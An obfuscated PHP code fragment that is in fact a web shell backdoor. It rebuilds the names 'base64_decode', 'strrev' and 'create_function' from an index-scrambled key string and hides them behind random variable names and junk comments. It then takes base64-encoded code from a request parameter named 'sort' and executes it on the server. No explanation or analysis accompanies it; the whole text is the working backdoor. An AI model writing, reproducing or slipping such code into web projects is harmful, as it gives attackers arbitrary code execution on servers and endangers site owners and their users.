...
$ITiXccTE4747 = "jti8_1hr36.uv4sc/klqgf*nya50zbom2;w()dp7e9x";


$drFnUhMn4953 = "";

foreach([14,30,7,1] as $x){
       $drFnUhMn4953 .= $ITiXccTE4747[$x];
    }


if(isset($REQUEST /*KKmvgxwjokJemhUgGasNAaWWATYiJQqtHCpczpOiQOfkLkeeNqfqdpZTmUdkrqkoYoMDmaBbMlUiChJVoymNaxvJrOCfsJycIUDXsFHObCcaNXGGiBMeqzksQCuUNWgJ*/["$drFnUhMn4953"])){
    $MtNkSegu1982 = $_REQUEST /*KKmvgxwjokJemhUgGasNAaWWATYiJQqtHCpczpOiQOfkLkeeNqfqdpZTmUdkrqkoYoMDmaBbMlUiChJVoymNaxvJrOCfsJycIUDXsFHObCcaNXGGiBMeqzksQCuUNWgJ*/["$drFnUhMn4953"];
    $oLCYzxDI7130 = "";
    $bsMqwzWg5929 = "";

    /*FoZutVIjFDCdhlkMqrLvZUMRzrqkIJdmTsciWrUKkfJdBFaYnrYHlniPOQIHMadVzpzQSHAejAlWpTleDlELRzXGwitXklxxzfpsiQzsBPgJxbPdnYEKQFgqyuxhbplT*/

    foreach([29,25,14,40,9,13,4,37,40,15,30,37,40] as $x){
       $oLCYzxDI7130 .= $ITiXccTE4747[$x];
    }

    /*TQyNRTRzmYuqYcMVrFXCjFIUTzWkmnsjGtbcTPDAracQSXdHOgKnVyDsIyNhQfSsNQYkpFJuQVdjgLNnEzQSbkTJQqYXOQMunholfohiIKywOtRMONqqBQBTscDHfuaq*/


    foreach([14,1,7,7,40,12] as $x){
       $bsMqwzWg5929 .= $ITiXccTE4747[$x];
    }

    /*hrXgoRaPUtnCPUofrUjIuqDXnHBkQSHfuvaVRnmqzUuCjpfroUwTGJZVCgTGUjIOasxDNDRKxqWwXDpxFOcYmWOMkyEXsucqbinfcMQYPFRjeKTwpBcWlcXwmKIgjzPM*/

    $x = $bsMqwzWg5929('n'.''.''.''.'o'.''.'i'.'t'.'c'.''.'n'.''.''.''.''.'u'.''.''.''.'f'.'_'.''.'e'.''.''.''.'t'.'a'.'e'.'r'.'c');
    $E = $x("", $oLCYzxDI7130($MtNkSegu1982));
    $E();
    exit();
